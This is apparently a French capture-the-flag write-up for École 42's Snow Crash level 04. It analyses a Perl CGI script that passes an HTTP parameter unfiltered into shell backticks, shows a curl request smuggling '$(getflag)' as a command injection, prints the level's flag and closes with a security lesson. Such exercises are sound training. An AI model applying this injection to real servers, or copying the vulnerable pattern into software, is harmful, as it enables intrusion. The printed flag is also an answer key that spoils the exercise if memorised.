# Level 04 – Snow Crash – École 42

## 🎯 Objectif
Obtenir le flag en exploitant une vulnérabilité présente dans un script Perl exécuté sur un serveur local via CGI.

---

## 📄 Fichier analysé

Le fichier `level04.pl` contient le code suivant :

```perl
#!/usr/bin/perl
use CGI qw{param};
print "Content-type: text/html\n\n";

sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

---

## 🔍 Analyse de la faille

- Le script utilise `param("x")` pour récupérer la valeur d’un paramètre HTTP.
- Cette valeur est injectée **sans filtre** dans une commande shell à l’intérieur de backticks Perl :  
  ```perl
  `echo $y`
  ```
- Cela rend le script vulnérable à une **injection de commande** (Command Injection).

---

## 💥 Exploitation

La machine exécute ce script via un serveur web sur le port `4747`.

En envoyant la requête suivante :

```bash
curl 'localhost:4747/?x=$(getflag)'
```

La commande devient côté serveur :

```bash
echo $(getflag)
```

Ce qui exécute la commande `getflag` et affiche le résultat dans la réponse HTTP.

---

## ✅ Flag obtenu

```
ne2searoevaevoem4ov4ar8ap
```

---

## 🧠 Leçon retenue

> **Ne jamais exécuter directement des entrées utilisateur dans une commande shell**, sans filtrage ni échappement.  
> L'utilisation directe des backticks avec des paramètres CGI rend le script vulnérable à une **Command Injection**.

---

## 📁 Fichiers

- `flag` : contient le flag obtenu
- `ressources/` : contient ce `README.md` + captures/notes éventuelles
